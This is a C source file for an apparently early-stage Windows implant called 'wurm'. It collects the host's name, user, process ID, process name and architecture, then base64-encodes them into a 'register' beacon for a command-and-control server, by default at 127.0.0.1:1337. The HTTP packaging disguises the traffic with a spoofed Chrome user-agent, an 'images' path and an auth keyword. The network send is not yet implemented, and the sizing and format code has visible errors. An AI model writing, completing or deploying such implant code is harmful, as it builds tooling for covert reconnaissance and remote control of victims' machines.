#include <windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

struct {
    struct {
        CHAR* address;
        CHAR* path;
        CHAR* user_agent;
        INT     port;
    } http;
    struct {
        CHAR* cookie;
        CHAR* keyword;
    } auth;
    struct {
        CHAR* status;
        CHAR* format;
        CHAR* buffer; // must be freed
        CHAR* encode; // must be freed
        CHAR  length[MAX_PATH];
        DWORD size;
    } data;
    struct {
        CHAR*   name; // must be freed
        CHAR    hostname[MAX_PATH];
        CHAR    username[MAX_PATH];
        CHAR    arch[MAX_PATH];
        CHAR    product[MAX_PATH];
        DWORD   pid;
    } info;
} wurm;

void Encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
    DWORD encoded_data_length = strlen(data_to_encode) * 2;
    wurm.data.encode = (CHAR*) malloc(encoded_data_length);
    
    CryptBinaryToStringA((BYTE *) data_to_encode, data_to_encode_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, wurm.data.encode, &encoded_data_length);
}

void Package(CHAR* buffer) {
    // Set local variables
    CHAR* carriage_return = "%s\r\n\r\n"; // Used as padding to send data
    CHAR* content_length_header = "Content-Length: %lu\r\n"; // Used as a header format
    DWORD dw_error = GetLastError();

    // Allocate buffer and define variables for structure
    DWORD package_length = strlen(buffer) + 5;
    CHAR* package = (CHAR*) calloc(package_length, sizeof(CHAR));
    sprintf_s(package, package_length, carriage_return, buffer);

    // Set local variables to data structure
    sprintf_s(wurm.data.length, MAX_PATH, content_length_header, package_length);
    wurm.data.buffer = package;
    wurm.data.size = package_length;

    if (strcmp(wurm.data.buffer, "") == 0) {
        printf("Error: %lu\n", dw_error);
    } else {
        printf("Allocated buffer: %s\n", wurm.data.buffer);
    }

    if (strcmp(wurm.data.length, "") == 0) {
        printf("Error: %lu\n", dw_error);
    } else {
        printf("Header set: %s\n", wurm.data.length);
    }

    // Clean up memory
    free(buffer);
}

void Register() {
    /*
    Registration data structure:
        Format (Status:Hostname,Username,PID,Process Name, Arch)
        Strings/Integers:
            Status          8 
            Hostname        256
            Username        256
            Process Name    256
            Arch            256
        DWORDS:
            PID             4
    */

    // Set local variables
    DWORD default_length = 256;
    DWORD dw_error = GetLastError();

    // Structures and handles for tlhelp32
    PROCESSENTRY32 process_info;
    process_info.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Must be closed

    // Set data allocation format
    wurm.data.status = "register";
    wurm.data.format = "%s:%s%s%d%s%s";

    // Enumerate local machine for information
    if (GetComputerNameA(wurm.info.hostname, &default_length)) {
        printf("Hostname: %s\n", wurm.info.hostname);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (GetUserNameA(wurm.info.username, &default_length)) {
        printf("Username: %s\n", wurm.info.username);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (GetCurrentProcessId()) {
        wurm.info.pid = GetCurrentProcessId();
        printf("Process ID: %lu\n", wurm.info.pid);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (Process32First(snapshot, &process_info)) {
        while (Process32Next(snapshot, &process_info)) {
            if (wurm.info.pid == process_info.th32ProcessID) {
                wurm.info.name = _strdup(process_info.szExeFile);
                printf("Process Name: %s\n", wurm.info.name);
            }
        }
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (GetEnvironmentVariableA("PROCESSOR_ARCHITECTURE", wurm.info.arch, default_length)) {
        printf("Operating System Arch: %s\n", wurm.info.arch);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    // Allocate memory to be encoded
    DWORD pointer_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch);
    CHAR* data_pointer = malloc(pointer_length); // Must be freed
    sprintf_s(data_pointer, pointer_length, wurm.data.format, wurm.data.status, wurm.info.hostname, wurm.info.username, wurm.info.pid, wurm.info.name, wurm.info.arch);

    // Base-64 encode the allocated data structure 
    DWORD data_length = strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch) + 2; // Add two null bytes
    Encode(data_pointer, data_length);

    // Allocate buffer in data structure
    CHAR* buffer = wurm.data.encode; // Note: wurm.data.encode does not need to be freed because it is buffer is pointing its allocation from it.
    Package(buffer);

    // Clean up memory and handles
    CloseHandle(snapshot);
    free(data_pointer);
    free(wurm.info.name); // Strdup requires variable to be freed
    free(wurm.data.buffer); // Note: Move to request function once refactored
}

int main(int argc, char* argv[]) {
    if (argc == 2) {
        wurm.http.address = argv[1];
        wurm.http.port = 1337;

    }
    else if (argc == 3) {
        wurm.http.address = argv[1];
        wurm.http.port = atoi(argv[2]);

    }
    else {
        wurm.http.address = "127.0.0.1";
        wurm.http.port = 1337;
    }

    printf("Attempting to connect to: %s:%d\n", wurm.http.address, wurm.http.port);

    // Set default HTTP options
    wurm.http.path = "images";
    wurm.http.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";

    // Set default authentication options
    wurm.auth.cookie = NULL;
    wurm.auth.keyword = "licketysplit";

    // Attempt initial beacon with registration data
    // Note: To properly send a beacon, a format and status must be set, data must be encoded and stored, then a buffer must be set along with its size and length 
    Register();
}